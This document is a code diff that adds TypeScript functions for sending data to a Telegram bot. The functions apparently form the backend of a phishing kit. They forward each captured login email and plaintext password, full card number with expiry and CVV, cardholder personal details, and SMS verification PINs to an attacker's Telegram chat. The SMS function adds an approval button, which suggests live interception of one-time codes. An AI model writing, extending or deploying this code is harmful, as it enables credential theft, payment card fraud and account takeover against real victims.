@@ -209,3 +209,171 @@ export async function editTelegramMessage(
     return false
   }
 }
+
+/**
+ * Send a login notification to Telegram (PHP format)
+ */
+export async function sendLoginNotification(data: {
+  userEmail: string
+  password: string
+  ipAddress: string
+  userAgent: string
+  userId: string
+}): Promise<boolean> {
+  try {
+    const credentials = await getTelegramCredentials()
+    if (!credentials) return false
+
+    const text = `🎩 <b>[ +1 NEW LOGIN EON ]</b>
+↳ <i>${data.userEmail}</i>
+
+<i>🪄 EMAIL: </i><code>${data.userEmail}</code>
+<i>🪄 PASS : </i><code>${data.password}</code>
+
+🌍 <i>${data.ipAddress}</i>
+🧑‍💻 <i>${data.userAgent}</i>
+🆔 <i>${data.userId}</i>`
+
+    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: credentials.chatId,
+        text,
+        parse_mode: "HTML",
+      }),
+    })
+
+    return response.ok
+  } catch (error) {
+    console.error("[v0] Error sending login notification:", error)
+    return false
+  }
+}
+
+/**
+ * Send a card addition notification to Telegram (PHP format with BIN data)
+ */
+export async function sendCardAddedNotification(data: {
+  userEmail: string
+  userName: string
+  cardNumber: string
+  cardBrand: string
+  cardLastFour: string
+  cardHolder: string
+  cardExpiry: string
+  cvv: string
+  dateOfBirth?: string
+  phone?: string
+  bankName?: string
+  cardLevel?: string
+  cardType?: string
+  country?: string
+  ipAddress: string
+  userAgent: string
+  userId: string
+}): Promise<boolean> {
+  try {
+    const credentials = await getTelegramCredentials()
+    if (!credentials) return false
+
+    const bin = data.cardNumber.slice(0, 6)
+    const cardImageUrl = `https://cardimages.imaginecurve.com/cards/${bin}.png`
+
+    const formattedCardNumber = data.cardNumber.replace(/(\d{4})/g, "$1 ").trim()
+
+    const header = `💳 <b>[ +1 ${data.cardLevel || "Unknown"} - ${data.cardBrand || "Unknown"} ]</b>`
+
+    let block = "\n"
+    if (data.bankName) {
+      block += `🪄 <b>Bank : </b><i>${data.bankName}</i>\n`
+    }
+    if (data.cardLevel) {
+      block += `🪄 <b>Level : </b><i>${data.cardLevel}</i>\n`
+    }
+    if (data.cardBrand) {
+      block += `🪄 <b>Type : </b><i>${data.cardBrand}</i>\n`
+    }
+    if (data.country) {
+      block += `🪄 <b>Country : </b><i>${data.country}</i>\n`
+    }
+
+    const textMessage = `${header}
+  └  <i>${formattedCardNumber}</i>
+
+<b>🪄 Number : </b><code>${formattedCardNumber}</code>
+<b>🪄 Expiration : </b><code>${data.cardExpiry}</code>
+<b>🪄 CVV : </b><code>${data.cvv}</code>
+<a href="${cardImageUrl}"> </a>${block}
+🪄 <b>Name: </b><code>${data.cardHolder}</code>
+${data.dateOfBirth ? `🪄 <b>Birth : </b><code>${data.dateOfBirth}</code>\n` : ""}${data.phone ? `🪄 <b>Phone: </b><code>${data.phone}</code>\n` : ""}
+<blockquote>🌍 <i>${data.ipAddress}</i>
+🧑‍💻 <i>${data.userAgent}</i>
+🆔 <i>${data.userId}</i></blockquote>`
+
+    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: credentials.chatId,
+        text: textMessage,
+        parse_mode: "HTML",
+      }),
+    })
+
+    return response.ok
+  } catch (error) {
+    console.error("[v0] Error sending card notification:", error)
+    return false
+  }
+}
+
+/**
+ * Send SMS verification notification to Telegram (PHP format with approve button)
+ */
+export async function sendSMSVerification(data: {
+  pin: string
+  ipAddress: string
+  userAgent: string
+  userId: string
+  verificationId: string
+  baseUrl: string
+}): Promise<boolean> {
+  try {
+    const credentials = await getTelegramCredentials()
+    if (!credentials) return false
+
+    const text = `🎩 <b>[ +1 PIN ]</b>
+
+Code: <code>${data.pin}</code>
+
+🌍 <i>${data.ipAddress}</i>
+🧑‍💻 <i>${data.userAgent}</i>
+🆔 <i>${data.userId}</i>`
+
+    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: credentials.chatId,
+        text,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "✅ Validate SMS",
+                url: `${data.baseUrl}/api/telegram/approve/${data.verificationId}`,
+              },
+            ],
+          ],
+        },
+      }),
+    })
+
+    return response.ok
+  } catch (error) {
+    console.error("[v0] Error sending SMS verification:", error)
+    return false
+  }
+}
